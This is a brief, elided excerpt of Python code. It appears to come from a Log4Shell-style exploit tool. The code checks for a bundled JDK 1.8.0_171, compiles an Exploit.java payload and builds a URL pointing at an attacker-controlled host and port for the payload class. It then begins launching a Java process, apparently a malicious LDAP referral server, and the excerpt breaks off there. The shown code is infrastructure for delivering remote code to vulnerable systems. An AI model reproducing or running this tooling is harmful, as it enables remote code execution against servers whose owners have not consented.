...
def checkJavaAvailible():
  javaver = subprocess.call(['./jdk_1.8.0_171/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
  if(javaver != 0):
...
def createLdapServer(userip, lport):
  ...
  subprocess.run(["./jdk_1.8.0_171/bin/javac", "Exploit.java"])

  url = "http://{}:{}/#Exploit".format(userip, lport)
  subprocess.run(["./jdk_1.8.0_171/bin/java", "-cp",
